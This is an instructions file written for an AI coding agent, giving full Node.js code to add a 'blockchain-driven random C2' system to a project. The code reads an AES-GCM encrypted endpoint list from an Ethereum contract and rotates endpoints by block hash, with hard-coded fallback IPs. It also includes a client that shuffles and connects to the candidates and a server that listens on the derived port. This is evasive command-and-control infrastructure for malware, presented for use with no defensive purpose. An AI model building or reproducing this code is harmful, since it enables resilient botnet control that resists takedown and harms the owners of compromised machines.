# instructions.md – Blockchain-Driven Random C2 Feature (For AI Agent)

## Overview
This document provides implementation instructions for adding a **blockchain-driven random C2 endpoint generation system** to your project. This feature includes:

- AES-GCM **encryption**
- **Multi-block C2 rotation**
- **Fallback** mechanism if blockchain/RPC is unavailable

The AI agent modifying your project should follow this document to integrate the functionality.

---
## 2. Dependencies

Add to `package.json`:

```json
"dependencies": {
  "ethers": "^6.0.0",
  "dotenv": "^16.0.0"
}
```

Install:

```
npm install ethers dotenv
```

---

## 3. Configuration File

Create `config/blockchain_c2.json`:

```json
{
  "enabled": true,
  "rpc_url": "https://mainnet.infura.io/v3/YOUR_PROJECT_ID",
  "contract_address": "0x0000000000000000000000000000000000000000",
  "block_step": 10,
  "candidates_per_cycle": 5,
  "aes_key_env": "BLOCKCHAIN_C2_AES_KEY",
  "fallback_config_path": "config/c2_fallback.json"
}
```

Fallback file:

```json
{
  "endpoints": [
    "203.0.113.10:443",
    "203.0.113.11:8443"
  ]
}
```

Set AES key:

```
export BLOCKCHAIN_C2_AES_KEY="0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
```

---

## 4. AES-GCM Utility Module

Create `src/c2/blockchain_c2_crypto.js`:

```js
const crypto = require("crypto");

function getKeyFromEnv(envName) {
  const hex = process.env[envName];
  if (!hex) throw new Error(`Missing AES key env: ${envName}`);
  const key = Buffer.from(hex, "hex");
  if (key.length !== 32) throw new Error("AES key must be 32 bytes");
  return key;
}

function encryptJsonToHex(obj, key) {
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);
  const plaintext = Buffer.from(JSON.stringify(obj));
  const enc = Buffer.concat([cipher.update(plaintext), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([iv, enc, tag]).toString("hex");
}

function decryptHexToJson(hex, key) {
  const buf = Buffer.from(hex, "hex");
  const iv = buf.subarray(0, 12);
  const tag = buf.subarray(buf.length - 16);
  const ciphertext = buf.subarray(12, buf.length - 16);
  const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
  decipher.setAuthTag(tag);
  const dec = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
  return JSON.parse(dec.toString("utf8"));
}

module.exports = { getKeyFromEnv, encryptJsonToHex, decryptHexToJson };
```

---

## 5. Blockchain C2 Generator (Multi-Block Rotation + Fallback)

Create `src/c2/blockchain_c2_generator.js`:

```js
const fs = require("fs");
const path = require("path");
const { ethers } = require("ethers");
const crypto = require("crypto");
const { getKeyFromEnv, decryptHexToJson } = require("./blockchain_c2_crypto");

const cfgPath = path.join(__dirname, "..", "..", "config", "blockchain_c2.json");
const config = JSON.parse(fs.readFileSync(cfgPath, "utf8"));
const provider = new ethers.JsonRpcProvider(config.rpc_url);

const CONTRACT_ABI = [
  "function c2Data() external view returns (bytes)"
];

async function getReferenceBlockNumber() {
  const latest = await provider.getBlockNumber();
  return latest - (latest % config.block_step);
}

function deriveHashes(seedBuffer, blockHashBuf, count) {
  const hashes = [];
  for (let i = 0; i < count; i++) {
    const h = crypto.createHash("sha256")
      .update(seedBuffer)
      .update(blockHashBuf)
      .update(Buffer.from([i]))
      .digest();
    hashes.push(h);
  }
  return hashes;
}

function mapHashToEndpoint(hash) {
  const ip = `10.${hash[0]}.${hash[1]}.${hash[2] || 1}`;
  const portBase = 1024;
  const portRange = 60000;
  const port = portBase + ((hash[3] << 8 | hash[4]) % portRange);
  return `${ip}:${port}`;
}

async function getOnChainEndpoints(aesKey) {
  if (!config.contract_address || /^0x0+$/.test(config.contract_address)) return null;

  const contract = new ethers.Contract(config.contract_address, CONTRACT_ABI, provider);
  const raw = await contract.c2Data();
  const hex = Buffer.from(raw).toString("hex");
  const json = decryptHexToJson(hex, aesKey);
  return json.endpoints;
}

function getFallbackEndpoints() {
  const p = path.join(__dirname, "..", "..", config.fallback_config_path);
  if (!fs.existsSync(p)) return [];
  const data = JSON.parse(fs.readFileSync(p, "utf8"));
  return data.endpoints || [];
}

async function generateC2Candidates() {
  const aesKey = getKeyFromEnv(config.aes_key_env);

  let refBlock, block;
  try {
    refBlock = await getReferenceBlockNumber();
    block = await provider.getBlock(refBlock);
  } catch (_) {
    return { mode: "fallback", endpoints: getFallbackEndpoints() };
  }

  if (!block || !block.hash) return { mode: "fallback", endpoints: getFallbackEndpoints() };

  const blockHashBuf = Buffer.from(block.hash.slice(2), "hex");
  const count = config.candidates_per_cycle;
  const seed = Buffer.from("blockchain-c2-seed");

  const hashes = deriveHashes(seed, blockHashBuf, count);
  let onChainEndpoints = null;

  try {
    onChainEndpoints = await getOnChainEndpoints(aesKey);
  } catch (_) {}

  if (onChainEndpoints) {
    const endpoints = hashes.map(h => onChainEndpoints[h[0] % onChainEndpoints.length]);
    return { mode: "on-chain", refBlock, endpoints: [...new Set(endpoints)] };
  }

  const endpoints = hashes.map(mapHashToEndpoint);
  return { mode: "hash-only", refBlock, endpoints: [...new Set(endpoints)] };
}

module.exports = { generateC2Candidates, getFallbackEndpoints };
```

---

## 6. Blockchain C2 Client Logic

Create `src/c2/blockchain_c2_client.js`:

```js
const net = require("net");
const { generateC2Candidates, getFallbackEndpoints } = require("./blockchain_c2_generator");

function shuffle(a) {
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

async function tryConnectOnce(endpoints) {
  endpoints = shuffle([...endpoints]);

  for (const ep of endpoints) {
    const [host, portStr] = ep.split(":");
    const port = parseInt(portStr, 10);

    const sock = await new Promise(resolve => {
      const s = net.connect({ host, port }, () => resolve(s));
      s.on("error", () => resolve(null));
      s.setTimeout(8000, () => { s.destroy(); resolve(null); });
    });

    if (sock) return sock;
  }

  return null;
}

async function connectViaBlockchainC2() {
  const cycle = await generateC2Candidates();
  let sock = await tryConnectOnce(cycle.endpoints);

  if (!sock && cycle.mode !== "fallback") {
    const fallback = getFallbackEndpoints();
    sock = await tryConnectOnce(fallback);
  }

  return sock;
}

module.exports = { connectViaBlockchainC2 };
```

---

## 7. Blockchain C2 Server Logic

Create `src/c2/blockchain_c2_server.js`:

```js
const net = require("net");
const { generateC2Candidates } = require("./blockchain_c2_generator");

async function startBlockchainC2Server(handler) {
  const cycle = await generateC2Candidates();
  const primary = cycle.endpoints[0];
  const [, portStr] = primary.split(":");
  const port = parseInt(portStr, 10);

  const server = net.createServer(handler);
  await new Promise(resolve => server.listen(port, "0.0.0.0", resolve));

  return server;
}

module.exports = { startBlockchainC2Server };
```

---

## 8. RPC Account Setup

To use blockchain C2, create a free RPC account at:

### **Recommended Providers**
- **Infura** → https://infura.io  
- **Alchemy** → https://alchemy.com  
- **QuickNode** → https://quicknode.com  

### Steps:
1. Register a free account  
2. Create a new Ethereum project (Sepolia testnet recommended for testing)  
3. Copy the HTTPS RPC URL  
4. Insert it into `config/blockchain_c2.json` under `"rpc_url"`  
5. Keep API keys private  

---

